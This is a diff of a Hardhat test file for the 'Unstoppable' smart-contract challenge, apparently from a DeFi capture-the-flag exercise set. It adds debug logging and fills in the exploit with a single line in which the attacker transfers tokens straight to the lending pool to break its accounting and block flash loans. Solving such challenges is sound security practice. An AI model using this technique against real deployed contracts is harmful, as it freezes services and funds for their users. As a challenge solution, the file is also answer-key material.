@@ -6,7 +6,10 @@ describe('[Challenge] Unstoppable', function () {
 
     // Pool has 1M * 10**18 tokens
     const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+    console.log("token in pool is:",TOKENS_IN_POOL);
     const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');
+    // details of attacker
+    console.log("details of attacker",INITIAL_ATTACKER_TOKEN_BALANCE);
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -18,8 +21,9 @@ describe('[Challenge] Unstoppable', function () {
 
         this.token = await DamnValuableTokenFactory.deploy();
         this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
-
-        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
+        // console.log("details of token contract",this.token.address);
+        const tx1=await this.token.approve(this.pool.address, TOKENS_IN_POOL);
+        console.log("details of approve transaction",tx1)
         await this.pool.depositTokens(TOKENS_IN_POOL);
 
         await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
@@ -40,6 +44,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
     });
 
     after(async function () {
